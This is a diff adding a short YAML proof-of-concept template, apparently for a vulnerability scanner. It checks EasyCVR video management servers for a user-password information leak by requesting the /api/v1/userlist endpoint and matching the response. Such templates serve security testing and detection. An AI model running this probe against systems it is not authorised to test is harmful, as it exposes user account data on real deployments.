@@ -1,0 +1,10 @@
+name: poc-yaml-EasyCVR视频管理平台-leak
+description: "用户密码信息泄露"
+method: GET
+path:
+  - /api/v1/userlist?pageindex=0&pagesize=10
+expression:
+  status: 200
+  body_all:
+    - "count"
+    - "Name"
